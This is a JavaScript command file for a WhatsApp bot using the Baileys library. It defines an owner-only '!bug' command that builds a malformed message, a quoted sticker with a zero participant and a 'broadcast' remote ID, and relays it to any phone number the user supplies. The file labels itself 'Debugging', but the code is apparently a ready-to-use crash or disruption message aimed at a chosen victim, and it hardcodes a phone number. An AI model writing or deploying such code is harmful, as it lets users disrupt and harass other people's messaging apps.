import { generateWAMessage, generateWAMessageFromContent } from 'baileys';
import fs from 'fs-extra';
import { S_WHATSAPP_NET, ZERO } from '../../helper/index.js';

/**
 * @type {import('../../types/Commands/index.js').CommandProps}
 */
export default {
	name: 'bug',
	minifiedDescription: '',
	description: 'Send bug.',
	category: 'Debugging',
	usage: '!bug',
	aliases: ['bug'],
	cooldown: 5,
	limit: 0,
	status: 'disable',
	async run({ from, bodyQuoted, mediaData, query, isOwner }, client) {
		if (!query && !bodyQuoted) {
			return;
		}

		if (!isOwner) {
			return;
		}

		const message = await generateWAMessage(
			'6289522534401@s.whatsapp.net',
			{ sticker: await fs.readFile('./src/media/blank.png') },
			{ upload: client.instance.waUploadToServer }
		);

		const messages = generateWAMessageFromContent(
			from,
			{
				extendedTextMessage: {
					text: '.',
					contextInfo: {
						participant: ZERO,
						remoteJid: 'broadcast',
						quotedMessage: {
							stickerMessage: message.message.stickerMessage
						}
					}
				}
			},
			{ messageId: client.instance.generateMessageID() }
		);

		await client.instance.relay(
			`${(query || mediaData.participant).replace(/([@s.+\s-]|whatsapp|net)/g, '')}${S_WHATSAPP_NET}`,
			messages.message,
			{
				messageId: messages.key.id
			}
		);
	}
};
